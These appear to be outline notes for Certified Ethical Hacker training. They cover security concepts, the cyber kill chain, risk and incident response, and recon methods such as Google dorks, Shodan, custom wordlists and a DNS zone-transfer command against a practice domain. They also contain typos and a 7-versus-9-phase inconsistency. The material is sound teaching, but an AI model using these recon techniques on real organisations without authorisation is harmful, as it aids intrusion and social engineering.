### Module 1
**Basic Cybersecurity Concepts**
1. Define the 5 elements of information security
    - List the 5 elements of cybersecurity
        - CIA Triad
            - Confidentiality
            - Intergrity
            - Availability
        - And others two
            - Authenticity
            - Non-Repudiation

**Attacker Motives, Goals and Objectives**
1. List and define common motives, goals and objectives of theat actors
- What motivates a person to commit a cyber attack?
        - Curiosity
        - Bravado
        - Disruption of Business
        - Hacktivism
        - Political
        - Religious Reasons
        - Terrorism
        - Revenge
            -  Hurt the target's reputation, finances or both 
        - Some form of cyber crime
            - Straight-up theft
           - Blackmail
           - Ransom

**Attack Classifications**
1. List and Define the different Attack classifications
2. Associate specific attacks types with the attack classifications
- Can we start off by listing Attack Classificatons we all need to be aware of?
    - Passive Attacks
    - Active Attacks
    - Close-In Attacks
    - Insider Attacks
    - Distribution Attacks
- Let's dig into Passive Attacks
    - Gathering info by inspecting network traffic
            - Clear-text Passwords
            - Other sensitive info (in the clear)
            - Difficult/impossible to detect
    - Passive Attack Examples?
            - Packet Sniffing
            - Network traffic analysis
            - Decryption
- Know talk about Active Attacks? What are they and how do they different from Passive
    - Manipulation of data
    - Disruption of services
    - Breaking into systems and compromising networks
    - Can be detected
- Active Attacks Examples?
    - DoS 
    - Password Attacks
    - Session Hijacking
    - Priv Esc 
    - SQLi
    - RCE
- Close-In Attacks
    - These attacks are possible through close proximity
        - Being physically near the target could provide opportunity to glean actionable intel
    - Could also be through intel
- Close-In Attacks Examples?
    - Social Engineering
    - Shoulder Surfing
    - Dumpster Diving
    - Eavesdropping
- Insider Attacks. What do we mean by Insider Attack and why is it so dangerous?
    - Assumed level of trust
        - Physical access
        - Computer access
        - Attacker is already beyond many/all safeguards
- Examples of Insider Attacks?
    - Intellectual Property
    - Customer PII
        - Pod Slurping
    - Stolen devices
    - Installing malware and keyloggers
    - Close-in attacks
        - Social Engineering
    - Distribution Attack Whats this all about?
        - Aka Supply-chain attack
        - Compromising software and hardware before customer installtion 
    - Examples of Distribution Attacks
        - Solerwinds

**Information Warfarre**
1. Define 'Information Warfare'
2. List and define Information Warfare
- What is Information Warfare?
    - Attempting to gain a competitive advantage through attacks against target's IT systems
- The term 'Information Warfare' is a bit generic and it breaks down into types or categories?
    - C2 Warfare
        - The control over compromised target systems with centralized management 
        - The effect or influence they can have on the target
    - Intelligence-based
        - The design and protection of systems that seek sufficient knowledge to dominate the battlespace and the denial of such knowledge to the adversary.
    - Electronic
        - Interrupting degrading/ stopping the means of electronic communication 
            - aka 'Jamming'
        - Psyschological
            - Attacking the morale and mental resolve of opponent
                - Attempt to get the opponent to GIVE UP
                        - Propaganda
                        - Terrorism
        - Hacker
            - 'Soldiers' of Information Warfare
            - Attack target systems (DoS/DDos)
            - Theft of data and systems
            - Disinformation campaigns
        - Economic
            - Interfere with target's Economic/Financial capabilities
                - Weaken target's economy
                        - Theft of IP
                        - Reputational Influence
        - Cyberwarfare
            - Similar to Information Warfare in it's definition
                - Includes
                    - Information Terrorism
                    - Semantic Attacks
                        - Take over of target system by where the appearance of normal operation is maintained
                    - Simulated Warfare (wargames)
                        - 'Sabre Ratting'
                        - Open display of weapons acquisition/capabilites
        - What Information Warfare strategies do we need to be aware of?
            - Defensive Information Warfare
                - Detection/Prevention
                - Alerts
                - Response
                - Deterrents
                - Emergency Preparedness
            - Offensive Information Warfare
                - Web Attacks
                - System hacking
                - MiTM/Replay/Session Hijecking

**Cyber Kill Chain**
1. List and define the 7 phases of the Cyber Kill Chain
2. Identify and explain activities performad at each phase

- Tell us a little about the development of the cyber kill chain.
    - Developed by Lockheed-Martn around 2011
    - researchers recognized a common attack pattern
        - Broke that pattern down into 7 phases
    - So we have 9 phases, what is the first phase of the cyber kill chain?
        - Recon 
            - Information gathering
                - Public info
                    - Technical and non-technical
        - Weapoization. Explain that idea.
            - Analyze info gathered in Recon
                - Find possibly exploitable vulnerabilities
                    - Create malicious deliverable payload to explout vulnerabilites
                        - Custom malware
                        - Off-the-shelf
                        - Phishing campaign
            - I'm guessing that once a payload is ready then Phase 3 Delivery?
                - Correct
                - Payload is delivered to target
                    - Email
                    - USB
                    - Web
                - How does the Exploitation Phase happen?
                    - Clicks on malicious link
                    - Goes to compromised web site
                    - Executes malicious software binary
                - Our next phase is Phase 5 Installation
                    - 'Insider' malware will install more malware
                        - Backdoors
                        - Malicious activity hiding
                        - Maintaining access
                - It would seem that the Attacker is now ready for the Command and Control Phase?
                    - Constant communicatonand control is established
                    - Use encryption and other techniques to hide malicious communication
                    - Attempt to Priv Esc.
                    - continue to hide Attacker presence
                - Phase 7 is called 'Actions and Objectives' 
                    - whatever reason the attacker decided to attack can now be done
                        - Cyber Crime
                        - Hacktivism
                        - Blackmail
                        - Political

**Tactice, Techniques and Procedures**
1. Define Tactics, Techniques and Procedures as they pertain to theat modeling
- What do we mean when we use the term 'TTP'
    - The behavior of an attacker?
        - Profiling
        - Threat modiling
    - Explain the concept of Tactics
        - Tactice are initial objectives
            - I want to gather networking information about my target
            - I want to find out what services my target is running
            - I want to get all the email addresses i can 
            - What vulnerabilites does my target have
    - So how does Techniques different from Tactics?
        - Techniques are the ways I achieve my objective and tools used
            - Perform DNS queries using dig
            - Perform network scans and banner grabbing
            - Scrape the internet for email addresses with the target domain
            - Perform vulnerability scanning against my target
    - Where do Procedures fit into the equation?
        - Advanced action taken to achive objectives
            - Threat actor profiles users on social media
            - Perorms advanced application testing to discove zero-day exploits
            - Does advanced obfuscation techniques in malware payloads


**Common Adversarial Behaviors**
1. Identify and explain specific common behaviors utilized by threat actors
- What is the purpose of identifying adversarial behaviors?
    - Predicting attack vectors
        - Better protection against said attack vectors
        - Increased detection rates
- What kind of specific behavior would an attacker engage in that we should be looking for?
    - Internal Recon 
        - Once attacker is inside, they start to enumerate the network..
            - Hosts
            - Services
            - Configs
            - Users
        - Defenders can look for signs of Internal Recon
            - Strange batch files
            - Bash/PowerShell commands
            - Packet capture
- You mentioned the use of Bash or PowerShell. How would an attacker use those tools?
    - Internal Recon 
    - Connecting to exfiltration
- If they are using built-in tools, how do we detect this activity?
    - It's difficult
    - Logs/Alerts
        - Will most likely contain identifiable information
- Are there other 'built-in' tools or features that could possibly be abused by an attacker?
    - Command Line  Terminal
        - Attacker can
            - Explore the system
            - Create accounts
            - Change configs
            - Modify data
            - Download install malware
- Any defense against that?
    - Again, It's difficult
        - Look for odd processes, files, connections
        - Using CLI/Terminal is odd behavior for most users
- What's one of the more sneaky behaviors an attacker may exhibit?
    - Abusing the HTTP User Agent field
        - Communicate with C2
        - Pass certain attacks to the target system
- Defenses?
    - WAF
    - Manual inspection
- What about Web Shells? How do they fit into this conversation?
    - Stealthy method of interacting with compromised web servers
        - Looks like regular web traffic (because it is) 
        - Data exfil
        - File upload download
        - Operating System control
- Defenses? Logging and monitoring
    - Nailed it!
    - WAF could help automate the process
- Common adversarial behavior wouldn't happen to include the use of Command and Control(C2) now would it?
    - Absolutely!
- Defenses?
    - Block known C2 IPs and Domains
    - ttps://exchange.xforce.ibmcloud.com/collection/Botnet-Command-and-Control-Servers-7ac6c4578facafa0de50b72e7bf8f8c4
    - Traffic and connection monitoring
    - Anomalous network activity
- What is DNS Tunneling  and how do attackers utilize this technique?
    - DNS traffic is crucial to a healthy network
        - Becomes a great way to piggy-back
            - C2 Traffic 
            - Data exfiltration
            - Firewall bypass
- Defenses?
    - Logging and monitoring
- Lastly, we have Data Staging. Explain this behavioral element
    - The collection of data collectedd by the attacker
        - It is made ready for exfiltration or destruction
- Defenses?
    - File integrity monitoring
    - Backups
    - Logging and monitoring

**Theat Hunting**
1. Discover data breaches through the careful examination of computer systems
2. Define categories of Indicators of Compromise(IoCs)
3. List common IoCs
- What is threat hunting?
    - Assuming a breach has already occurred
    - 200 days before breaches are discovered
- How do we perform threat hunting?
    - Hypothesize the most likely attack
    - Look for suspicious malicious risky activity based on that hypothesis
    - Threat hunting can generate Indicators of Compromise (IoC) and alerts
- Can you explain the concept  of an IoC?
    - Evidence on a device that point to a security breach
    - Usually gathered AFTER a suspicious incident or security event
    - IoC data can be
        - Atomic
            - Self-Contained data
                - IP Address
                - Email Address
            - Computed
                - Derived data
                    - Hash values
                    - Reg ex
                - Behavioral
                    - Logically combining Atomic and Computed
- What are the IoC categories?
    - Email
        - Comprised of email artifacts
            - Sender's email address
            - Subject line
            - Attachments
            - Links
    - Network
        - Artifacts
         - Domain info
        - IP Address
    - Host-Based
        - Artifacts
            - File names
            - Hash values 
            - Registry entries
            - Drivers
    - Behavioral
        - Artifacts
            - Macros running PowerShell
            - Service accounts running commands like a user would
- Can you give us a few concrete examples of IoC?
    - Anomlies found in Privileged User Activity
    - Red flags found in log-in activity
    - Deviant DNS requests
    - Web traffic with inhuman behavior
    - Unusual activity in outbound network traffic
    - Geographical abnormalities
    - Increased database read volume
    - Unusual HTML response sizes
    - Changes in mobile device profiles
    - Signs of DDoS activity
    - Wrongly placed daa bundles
    - Conflicting port-applicaton traffic
    - More requests then usual for the same file
    - Unusual changes in registry an or system files
    - Abrupt patching of systems

**Hacking Phases**
1. Define 'hacking'
2. Describe what a 'hacker' is and isn't
3. Label hacker 'classes' or 'categories'
4. Classify, order and describe each of the 5 hacking phases
- what is 'hacking'?
    - General term
    - Term as it's applied to computer security
- A hacker is a person in a hoodie, right? or are htere others that would fit the descriptionn of a hacker?
    - Threat actor
    - Hobbyist
- What are the categories that hackers may fall under?
    - White Hat
    - Black Hat
    - Grey Hat
    - Suicide Hacker
    - Script Kiddies
    - Cyber Terrorist
    - State-Sponsored
    - Hacktivist
- Let's discuss the 5 hacking phases? Can you list those out for us?
    - 1) Recon, 2) Scanning, 3) Gaining Access, 4) Maintaining Access, 5) Clearing Tracks
- We have touched a bit on Recon in previous episodes is there anything else we need to be aware of in regards to Recon?
    - Passive Recon
    - Active Recon
- How does the Scanning phase differ from the Recon phase?
    - Pushing Active Recon farther
        - Port and Service scans
        - Host discovery scans
        - OS enumeration
        - Vulnerability Scanning
- Is the 'Gainning Access' phase as simple as the name implies, or is there more to it?
    - Hacker exploits a Vulnerability and gains system access
    - Methods for doing that are as varied as the vulnerabilities but include
        - Password attacks
        - RCE attacks
        - Injection attacks
        - Session Hijecking
    - Priv Esc and Pivoting
- So the next phase is 'Maintaining Access'? That seems logical.
    - Install malware
        - RAT's
        - Rootkits
        - Backdoors
    - Crack user passwords
    - System Hardening
        - Make sure that only they have the ability to control the system
            - No other hackers are invited to the party
- Why are attackers concerned with Covering Tracks? And what tracks are they covering?
    - Hide their identity!!!
    - Maintain access
    - Clearing logs
    - Stenography
    - Tunneling

**Ethical Hacking Concepts**
1. Define Ethical Hacking and defferentiate it with malicious hacking
2. Articulate the usefulness of ethical hacking
3. Identify the limitatons of ethical hacking
4. Describe the common skill-set of an ethical hacker
- What is an Ethical Hacker and how we are they  different from malicious hackers?
    - Necessary 'evil'
- Do Ethical Hackers have any limitations or restrictions that malicious Hacker don't 
    - Scope
        - Systems
        - Times
    - Do no harm
- Can you give us a more detailed explanation of the skills an Ethical Hacker would have?
    - Technical skills
        - Admin level skills with Operating Systems
        - Admin level networking skills
        - Familiarity with basic security concepts and practices
        - Programming / Scripting
        - Cloud / Containers
        - Mobile devices and IoT
        - ICS / SCADA / OT
    - Non-Technical learner
        - Tenacious
        - Out-of-the-box thinking
        - Soft Skills (oral/written)
        - Legal knowledge

**Risk**
1. Define Risk as it pertains to Cybersecurity
2. Calculate Risk based off of Impact or Asset Value
3. Calculate Risk Levels
4. Visualize Risk with a Risk Matrix
- Seems like a simple question with an obvious answer but what is risk?
    - Probability of harm negative impact due to attack or breach
    - Formulating Risk 
        - Threats x Vulnerabilities x Impact = RISK
        - Threat x Vulnerability x Asset Value = RISK
    - Break it down
        - Probability a negative event will occur
        - Outcome of a negative event
    - Risk seem bad. But it seems that not all risks are created equal. Can we qualify Risk in some way?
        - Risk levels
            - Impact x Probability = Risk Level
                - (EC-Council; Consequence x Likelihood)
            - Risk Levels
                - Low 
                    - There is threat, but it's unlikely to occur
                    - If threat occurs, Impact is negligible
                - Medium
                    - Threat is likely, but not imminent
                    - You have some time, but it's about to hit
                    - Mitigate asap to reduce risk impact
                - High Extreme Critical
                    - You need to take action IMMEDIATELYR reduce impact risk
                    - Threat is certain to occur with high impact
- Is there a way to codify the risk assessment?
    - Risk Matrix
        - RAG Chart

**Risk Management**
1. Define Risk Management
2. List and define the 4 phases of Risk Management
- Let's start by defining Risk Management and it's objectives.
    - A continuous process of keeping risks at an 'acceptable' level
        - aka 'Managing' risk
    - Objectives
        - Identify risks and their possible impact
        - Prioritize risks based on severity levels
        - Control/Mitigate/Prevent risk
        - Track and review risk
- What  are the 4 phases of Risk Management?
    - Identify
    - Assess
        - Likelihood and Impact
        - Prioritizetion
            - Is this a 'one and done' Thing. or should this be done periodically?
        - Treat
            - Mitigations
            - Security Controls
            - Costs, Benefits
        - Treack and Review
            - kind of like an audit of your Risk Management strategy
                - Did we do what we said we were gonna do?
                    - Budget
                    - Time
                    - Items
                    - Process
                - Was our strategy and/or components appropriate?
                - What mistakes did we make?
                - Anything unforeseen?

**Cyber Threat Intelligence**
1. Define CTI
2. Describe how CTI is used to engege in threat modeling
3. List and define the 4 type of CTI
- How do we define CTI?
    - The gathering, processing and analysis of data about theats.
        - Purpose of understanding
            - Motives
            - Targets
            - Attack Behaviors
        - Aids defenders
            - Faster
            - Better equipped to withstand attacks
            - More informad defensive strategies
            - Be proactive instead of reactive
            - Possibly reveal unknown threats
- What are the different types of CTI?
    - Strategic
    - Operational
    - Tactical
    - Technical
- Why do we break CTI down into these categories?
    - To speak to different audiences
        - High-level
            - Managers
                - Business Strategy
                    - Strategic CTI
                        - How do we deal with the likely threats to our organizations?
                        - Sources
                            - OSINT
                            - CTI Vendors
                    - Operational CTI 
                        - Specific attacks against your organization
                        - APT reports
- I assume that there is 'Low-level' then?
    - Yes 
        - Low-level
            - Technicians/Engineers
                - Operational deployment strategies
                    - Tactical CTI
                        - Sources:
                            - Malware analysis
                            - IH&R reports
                            - APT reports
                    - Technical CTI
                        - Very specific information
                            - More ATOMIC inforamtion
                                - Tacical = Phising email
                                - Technical= Malicious link in phishing email

**Threat Modeling**
1. Define Threat Modeling
2. List and describe the 5 steps in the Threat Modeling process
- I know we've talked a bit about Threat Modeling in other episodes, but can you just give us a quick reminder of what Threat Modeling is?
    - A systematized approach to assess the risk/security of an organization
        - know thy enemy
            - What are the common/most likely attack methods
            - The more detail the better
        - Know they self
        - Where are we vulnerable
- What are the steps in the Threat Modeling process?
    1. Identify security objectives
        - What needs to be secured?
        - Any regulatory or policy compliance requirements?
    2. Application overview
        - Identify:
            - Roles
                - Who will be using this?
            - Usage scenarios
                - How will this be used normally?
                - How could this be misused?
            - Technologies
                - OS
                - Supporting Apps and services
                - Network technologies
            - Security mechanisms
                - Authentication
                - Authorization
                - Input validation
                - Encryption
    3. Decompose the application
        - Diagrams help here
        - Identify
            - Trust bounderies
            - Data flows
            - Entry points
            - Exit points
    4. Identify threats
    5. Identify Vulnerabilities
- This sounds like a lot of work to develop. Are there any standard models for us to use as guide?
    - STRIDE
https://blog.eccouncil.org/what-is-stride-methodology-in-threat-modeling/
    - PASTA (Process for Attack Simulation and Threat Analysis)
https://blog.eccouncil.org/what-is-pasta-threat-modeling/
    - DREAD
https://blog.eccouncil.org/dread-threat-modeling-an-introduction-to-qualitative-and-quantitative-risk-analysis


**Incident Management**
1. Define Incident Management
2. Elaborate on what Incident Management is designed to accomplish
- What is a Security Incident?
    - An event where security and data CIA is treatened 
        - Phishing attacks
        - Ransomware
        - DDoS
        - Injection attacks
- So what do we mean by the term Incident Management?
    - Process by which we 
        - Identify
        - Analyze
        - Prioritize
        - Resolve
    - This is all in an effort to
        - Restore normal business operations
            - ASAP
- Are there any other elements of Incident Management that we need to be aware of?
    - The importance of End-User Awareness training as a part of IM
    - Relevant Departments and their involvement in IM
        - HR when sanction or termination is required
        - Legal
        - IT Security staff
        - 3rd Parties that may be affected by an incident

**Incident Handling and Response**
1. List and define the 9 steps of the IH&R process
- Preparation
    - Create Policy and Procedure
        - Generate documentation
    - Training
        - IH&R Team
        - End User Security Awareness
    - Assemble a toolkit
- Incident Recording and Assignment
    - Addresses how to properly report and record an incident
        - Identify what happened
        - Contact the right people
            - Using proper communication channels
        - Ticket submission
- Triage
    - Analyze, confirm, categorize and prioritize Security Incidents
        - Attack type
        - Severity
        - Intended Target
        - Impact
        - Propagation Method
        - Vulnerabilities that were exploited
- Notification
    - Time to inform
        - Stakeholders
            - Management
            - 3rd Party vendors
            - Clients
- Containment
    - Self-explanatory
        - Pull the plug
        - Network Segmentation
        - Sandbox
        - Quarantine
- Evidence Gathering and Forensic Analysis
    - CSI TIME!
        - Explain the attack using evidence and logic
            - Get as much detail as possible
- Eradication
    - Remove the root cause of the incident
    - Secure the vulnerabilities that facilitated the attack
- Recovery
    - Bring affected resources back online
        - This should cause no further disruption to the organization
- Post-Incident Activities
    - Incident Analysis / Final Review
        - Documentation
        - Impact Assessment
        - Policy creation/revision
        - Lessons Learned
        - Disclosure

**ML and AI**
1. Examine the role of AI and ML in Cybersecurity
2. Identify AI/ML classifications
3. Define the 9 main Cybersecurity areas/categories that utilize AI/ML
4. Determine how AI/ML aid in the prevention of cyber attacks
- What is Artificial Intelligence?
    - Computers that are built to mimic human behavior
        - Specifically
            - Problem Solving
            - Decision Making
- What is Machine Learning?
    - Subset of AI
    - Gives the AI the ability to LEARN
        - Learning Techniques
        1. Supervised Learning
        - ML is provided with Labeled Datasets
            - These train the ML to classify data and or to predict outcomes
        - 2 Problem Types (what problems does this solve?)
            - Classification
                - Classify or categorize data into defined groups
                    - Apples and oranges
                    - Spam or Valid Email
            - Regression
                - Discerns the relationship between independent and dependent variables
                - Good at predicting numerical values
                    - Sales revenue projections
            2. Un-supervised Learning
            - Analyze and cluster UNLABLED DATA SETS
                - Discovers hidden patterns without help from humans
            - 3 Problem Types
                - Clustering
                    - Grouping unlabeled data based on similarities/defferences

                - Association
                    - Discovers relationships between variables in given dataset
                        - Customerrs who bought this also bought x
                - Dismensionality Reduction
                    - Reduces high number of data inputs to a manageable size
                        - Reduction doesn't affect data intergrity
                            - Picture quality improvement algorithms
- How is ML and AI being used in the Cybersecurity space?
    - Endpoint Security
    - Authentication
    - Phishing
    - Threat Detection
    - Vulnerability Analysis
    - Behavioral Analysis
    - Network Security
    - AI vs AI

**Standards and Regulations**
1. Prescribe proper Cybersecurity standard/regulation for a given organization
2. Explain common Cybersecurity laws and their application

- PCI-DSS
     - Payment Card Industry Data Security Standard
        - High Level Overview on p.5 of PDF
            -  https://www.pcisecuritystandards.org/document_library?category=pcidss&document=pci_dss
    - ISO 27001:2013
       - https://www.iso.org/standard/54534.html
    - HIPAA
        - https://www.govinfo.gov/content/pkg/PLAW-104publ191/pdf/PLAW-104publ191.pdf
        - https://www.hhs.gov/hipaa/for-professionals/index.html
            - Administration Simplification Rules
                - Privacy Rule
                - Security Rule
                - Enforcement Rule
                - Breach Notification Rule
                - Transactions
                - Code Standards
                - Employer Identifier Standard
                - Nation Provider Identifier Standard
- Sarbanes Oxley Act
    - https://www.govinfo.gov/content/pkg/PLAW-107publ204/pdf/PLAW-107publ204.pdf
        - Protections for investors and pubic in general
           - Thanks Enron!
         - 11 Title Sections
- DMCA
    - https://www.govinfo.gov/content/pkg/PLAW-105publ304/pdf/PLAW-105publ304.pdf
    - Protects IP/Copyrighted works and online services
- FISMA
    - Federal Information Security Management Act
    - US Federal Government oversight and security policies and practices
        -  https://www.congress.gov/113/plaws/publ283/PLAW-113publ283.pdf
        - https://www.congress.gov/bill/113th-congress/senate-bill/2521
        - Overview
- GDPR
    - General Data Protection Regulation
    - https://www.gdpreu.org/
        - GDPR Definitions
        - 7 Principles
        - Individual Rights
        - Breaches
- Data Protection Act(DPA) 2018
    - Update to the act
        - First version created in 1998
        - Amended in 2021
- https://www.legislation.gov.uk/ukpga/2018/12/contents
    - UK compliance and harmony with GDPR

### Module 2
**Footprinting Concepts** 
1. Define Footprinting and Footprinting types and describe its objectives in the attack process
2. Explain types of information gathered during the Footprinting phase
3. Explore Footprinting as Methodology
- What is Footprinting?
    - Passive 
        - No direct interaction with target
            - Kind of like 'eavesdropping' on a conversation
            - Looking for freely available/public info
                - May get lucky and find unsecured sensitive info
        - Difficult/impossible to detect
    - Active
        - Direct interaction with target
            - Interrogation vs eavesdropping
        - Detecting possible
- What kinds of information are attackers looking for?
    - System info
        - OS type
        - Services
        - Usernames/Passwords
    - Network Info
        - DNS
        - Domain/Sub-domains
        - Firewall rules
    - Organiztional Info
        - Contact info
        - Employee info
        - Location info
- How does this information help attackers?
    - May reveal security controls
    - Helps them focus on live targets
    - Vulnerability identification
- So does Footprinting directly lead to taget compromise?
    - Usually not directly, but it is a crucial step towards those ends
    - It supports compromise attacks like
        - Social Engineering
        - Sensitive Data Exposure
        - System network Hacking

**Google Dorks** 
1. Utilize Google advance search features to footprinting a target
- What in the world are Google Dorks?
- How do we use them to perform recon?
- https://gbhackers.com/latest-google-dorks-list/
- https://www.boxpiper.com/posts/google-dork-list

**Shodan, Censys and Thingful** 
1. Footprint a target using IoT search engines for details such as deployed Technologies VoIP and VPN
- We have looked at many different ways to gather information about a client/target, but we've mostly talked about searching for user/org/web info. what about the actual technologies and internent coonected devices? How would we get that kind of info?
    - Shodan, Censys and Thingful
- Let's start off with shodan. what aare some of the deails about shodan we neet to know?
    - https://help.shodan.io/the-basics/what-is-shodan
    - Shodan Demo
- Shodan seems pretty useful, but you mentioned Censys. How does Censys differ?
    - https://about.censys.io/
    - Censys Demo
- Is Thingful just another IoT search engine?
    - It is but it does some interesting things
        - https://www.thingful.net/site/about
    - Thingful Demo
        - Webcam
        - Wind

**Sub-Domain Enumeration** 
1. Search for a target's subdomains by utilizing common hacking tools to properly footprint their attack surface
- What is a sub-domain?
    - Domains
        - Main web presence
            - Domain name
                - aka 2nd level Domain
            - gTLD (Generic Top-Level Domain)
                - Catch-all for specific areas
                    - .com
                    - .net
    - Sub-Domains
        - Secondary web presence
            - Used to organize web sites that are big enough to need their own space
                - Same idea as a Sub-directory in a file system
- How do we do subdomain enumeration and why is it important to ethical hacking?
    - It's important because
        - It's apart of the attack surface
    - We can find them a couple of ways
        - Manual searching (Demo)
            - Google
                - site:itpro.tv
            - Page source code
- That seems a bit tedious. Can we automate that process?
    - Automation (demo)
        - netcraft
        - sublist3r
- https://hover.blog/whats-a-domain-name-subdomain-top-level-domain/

**Geolocation Recon** 
1. Employ satellite imaging, surveying and mapping tools to discover geolocation info about a given target
2. Analyze geolocation information to discover possible vulnerabilities
- Why do we care about the geographical location of a target?
    - Support our
        - Social Engineering attacks
            - Knowledge of local 'haunts' and surroundings gives the attacker social credit
        - Physical attacks
            - Break/ lunch/ smoking areas
            - Cameras
            - Enternces/ Exits
            - Gates/ Guards
            - Googd hiding spots
    - Demo 
        - Google Maps
        - Wikimapia

**Social Networking Recon** 
1. Gather information about target's personnel through social Media using common OSINT tools
- What are we trying to learn from Social Media sites?
    - Company info
    - Employee info
        - Email addressess
        - Job Titles
        - Interests
        - Technologies used in the org
        - badges
        - Professional connections
        - 3rd-party details
- What Social Media sites should we be looking at to gather this info?
    - The usual cast of characters
        - Facebook
        - LinkedIn
        - Twitter
- Is this a manual process, or do we have tools that can automate for us?
    - theHarvester

**Job Board Recon** 
1. Gather useful target information like employed technologies and organizational structure through searching job board posts
- We're talking about recon and today's show is about using Job Boards for that purpose. Can you help us put the puzzle together on how that works?
    - Job boards contain a lot of information
        - Job roles
        - Contact info
        - Locations
        - Email Addresses
        - Implemented technologies

**Deep/Dark Web Recon** 
1. Acquire target sensitive information like account creadentials, credit card numbers and Social Security Numbers
- Today we're talking about the Deep/Dark Web Can we start by defining some of these terms?
    - Surface Web 
        - Normal Websites you're used to browsing to 
            - Facebook
            - Google
    - Deep Web
        - The part of the internet not reachable(indexed) by search engines
            - It's kinda 'hidden'
                - Think of content behind a paywall
                - Cloud storage
                - Web mail
                - Banking
                    - Actually represents something like +/-%96 of internet content
- It can get confusing from here as we get into the Dark Net and the Dark Web. What is the difference?
    - Dark Net 
        - This is where it gets weird
            - Meant to be an 'anonymous' and hidden network by nature
                - Uses encryption
                - Can require special browsers
                    - 2 types of Dark Nets 
                        - Friend-2-Friend
                            - Very anonymous Peer-2-Peer network
                                - https://freenetproject.org
                                - https://retroshare.cc/
                        - Privacy Networks
                            - Tor
- Dark Web
    - Dark Web and Dark Net are 'related'
    - Best described as 'websites that exist on the Dark Net'
        - Much of it is pretty nasty stuff
- How do we access the Dark Web? Is that what the Tor browser is all about?
    - Torr browser demo
        - Hidden Wiki
        - Markets

 **Custom Wordlists**
1. Gather words from target's website to generate a custom wordlist
2. Use custom wordlists in brute-force attacks
- Let's start be defining the term 'wordlist'
    - A simple text file
    - Each line contains a 'word'
    - Used by hackers to perform password attacks
- Are there standerd wordlists in common use and if so why would we make a 'custom' wordlist?
    - Standard wordlists exist
    - Custom wordlists will 'fill the gaps'
- Can you explain what you mean by 'fill the gaps'?
    - Users make passwords they can remember
        - Therefore passwords typically arerelated to their everyday lives
            - Work 
            - Hobbies
            - Family
    - Let's focus on the 'Work' category
        - Employees use work related words in passwords
            - Custom wordlists with work-related words = more effective word lists
- It's all making sense to me now. So the question then becomes how do we create a custom wordlist?
    - Manually (too much time)
    - Tools/Automation
        - cewl demo

**Metadata Recon**
1. Employ OSINT tools to gather sensitive information from metadata found in freely available target documents
- What is metadata and how is it important to our recon efforts?
    - Information you don't normally see
        - Author
        - Creation date/time
        - Other
            - metagoofil demo
                - Finds documents related to target
- Metadata can help
    - Social Engineering
    - Phishing
- How do we see this information?
    - exif
    - exiftool

**Email Tracking**
1. Utilize email communications to gather target information like IP addresses, geolocation, and end point details
- We're sitting here in the Footprinting and Recon domain for CEH, and we need to take a look at Email Tracking. Just a quick question before we continue. What is email tracking? :)
- Verify that an email was successfully delivered and opened
    - Proxy use
    - IP address
    - Geo-location
    - How long it took to read
    - Were links clicked
    - OS type
    - Browser type
    - Host device type
- How can these tracking programs get all this information?
    - Read Receipts
        - Users opt-in to reporting email status
    - Tracking Pixels
        - Tiny Image embedded into the email
            - 1 pixel x 1 pixel generated by code built to track user activity
    - Trackable Links
- How does one utilize email tracking?
    - Many different tools
        - Linkly
        - bitly
        - Infoga
        - EmailTrackerPro

**WHOIS and DNS**
1. Attain actionable target information like organization owner, name server details, and contact details
2. Collect detailed DNS information about target network environment
3. Utilize DNS info to create detailed network map
- How familiar should we be with utilizing WHOIS?
    - Thick Model
        - Contains complete info such as...
            - Administrative
            - Billing
            - Technical Contact
            - Domain info
    - Thin Model
        - Only contains the domain's registrar Whois server
- Can you show us?
    - Whois demo
        - It never hurts to VERIFY your target!
- Let's move on to DNS. What info do we get targeting DNS?
    - IP Addresses
    - Domain Names
    - Mail Server Info
        - Demo
            - nslookup
            - dig
            - dnsrecon
- I've heard Zone Transfers are the ultimate goal for DNS enumeration. Why is that?
    - Meant to transfer all DNS info from Primary server to Secondary
    - Will give you a LOT of info
    - Great for helping attackers map out the target network
        - Spoofing
        - Social Engineering
- How would we perform a Zone Transfer?
    - Demo
        - dig axfr @nsztm1.digi.ninja zonetransfer.me
        - https://digi.ninja/projects/zonetransferme.php

**Public Network Footprinting**
1. Ascertain target network details such as IP range, internet-facing devices/servers, route path, and possible network-based security controls
- Question for Kathy
    - ARIN (American Registry for Internet Numbers)
    - Registration Data Access Protocol (RDAP)
        - Search ARIN for IP address of target
- How do we determine the route path to the target
    - Traceroute
        - ICMP
            - tracert
            - traceroute -I
        - TCP
            - traceroute -T
            - tcptraceroute
- Any other traceroute-type tools?
    - Path Analyzer Pro
        - https://www.pathanalyzer.com
    - VisualRoute
        - https://www.visualroute.com

**Social Engineering Recon**
1. Collect sensitive information through the use of Social Engineering techniques such as eavesdropping, shoulder surfing, dumpster diving, and/or impersonation
- I've seen 'Sneakers' and I though Social Engineering was used to access accounts and steal from unsuspecting bank managers and grandparents.
    - Yes
    - Not limited to those types of attacks
        - Network info
        - Network access creds
        - Security Controls
            - Make/model
        - Operating Systems
- You can get this by just asking questions?
    - Partly
        - Techniques
            - Eavesdropping
            - Shoulder Surfing
            - Dumpster Diving
            - Impersonation
- Tell us about Eavesdropping
    - Listening in on conversations
    - Intercepting communications
        - phone
        - email
        - text/audio/video
- How about Shoulder Surfing
    - Literally watching over the shoulder for...
        - passwords
        - PIN
        - account/credit card numbers
- Dumpster Diving sounds like a fun way to get recon.
    - Literally jumping in a dumpster
        - Day calendars
            - Great source of info
                - Sticky notes
                - Print-outs
- That just leave Impersonation
    - Test out your acting chops
        - Phone conversations
        - In person conversation

**Other Footprinting Tools**
1. List commonly used Footprinting specific tools
- We've looked through many different footprinting and recon tools in the domain, but here were are doing an episode called 'Footprinting Tools'?
    - Other tools we haven't mentioned yet
    - Commonly used by Ethical Hackers
        - Foca (Fingerprinting Organizations with Collected Archives)
            - Find metadata from target domain
        - OSINT Framework
            - https://osintframwork.com/
        - Recon-Dog
            - API-driven recon tool
        - Maltego
        - Recon-ng

**Footprinting and Recon Countermeasures**
1. Identify and recall common security controls used to protect organization against footprinting activities
- We've seen many techniques and tools used for gathering information, but what can we do to protect ourselves?
    - Review and edit what info is available
        - Create Security Policy to enforce
    - End-User Security Awareness Training program
    - Opt-in to WHOIS privacy services
    - Encryption
    - Protect with Authentication Mechanisms
    - Be paranoid on Social Media
    - Disable location services
    - Sanitize job listings
## Module 3
**Network Scanning Types**
1. Identify and apply the 3 types of network scanning
2. State the objectives of network scanning
- What is network scanning?
    - The active process of utilizing networking technologies to gather information about a target network
- What are the types of network scanning?
    - Network scanning aka HOST DISCOVERY (CEH definition)
    - Port/Service scanning
    - Vulnerability scanning
